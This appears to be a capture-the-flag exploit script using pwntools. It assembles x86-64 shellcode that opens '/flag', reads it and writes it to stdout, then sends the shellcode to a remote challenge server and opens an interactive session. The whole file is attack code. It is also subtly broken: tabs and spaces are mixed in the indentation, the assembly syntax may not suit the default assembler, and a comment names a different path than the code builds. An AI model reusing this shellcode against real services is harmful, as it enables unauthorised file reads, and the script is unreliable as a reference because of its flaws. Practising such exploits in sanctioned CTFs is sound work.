from pwn import *

def main():

    # stack
    shellcode = asm('''
    
            mov dword [rsp], '/fla'     ; build filename on stack
            push 'g'
            pop rcx
            mov [rsp+4], ecx
        ''')
	# sys_open()
    shellcode += asm('''
            
            lea rdi, [rsp]              ; rdi now points to filename '/flag/level1.flag'
            xor rsi, rsi                ; rsi contains O_RDONLY, the mode with which we'll open the file
            xor rax, rax
            inc rax
            inc rax                     ; syscall open = 2
            syscall 
		''')
	# sys_read()
	shellcode += asm('''
    
            mov rbx, rax                ; filehandle of opened file

            lea rsi, [rsp]              ; rsi is the buffer to which we'll read the file
            mov rdi, rbx                ; rbx was the filehandle
            push byte 0x7f              ; read 127 bytes. if we stay below this value, the generated opcode will not contain null bytes
            pop rdx
            xor rax, rax                ; syscall read = 0
            syscall
		''')
	# sys_write()
	shellcode += asm('''
            lea rsi, [rsp]              ; the contents of the file were on the stack
            xor rdi, rdi
            inc rdi                     ; filehandle; stdout!
            mov rdx, rax                ; rax was amount of bytes read by syscall read
            xor rax, rax
            inc rax
            syscall                     ; syscall write = 1
		''')
	#r = process("./chall")
	r = remote("ctf.tcp1p.com", 8008)
	r.sendline(shellcode)
	r.interactive()
if __name__ == '__main__':
	main()
